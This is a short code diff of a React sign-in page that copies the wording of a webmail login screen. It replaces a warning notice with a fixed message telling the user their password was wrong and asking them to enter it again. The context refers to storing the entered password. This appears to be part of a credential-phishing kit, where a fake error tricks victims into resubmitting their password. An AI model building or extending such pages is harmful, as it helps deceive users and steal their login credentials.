@@ -120,7 +120,7 @@ setlpass(currentpass)
 			&#x200E;&#x200E;
 			</div>
 		<div id="prvtExp" className="signInExpl" style={{display:'none'}} role="note">Select this option if you&#39;re the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</div>
-	{show &&	<div id="prvtWrn" className="signInWarning"   role="note">Warning:  By selecting this option, you confirm that you have right to access the information contained therein.</div>
+	{show &&	<div id="prvtWrn" className="signInWarning"   role="note">The password your entered isn't correct, please enter your correct password</div>
 			}
                
 		<div id="expltxt" className="signInExpl" role="alert">
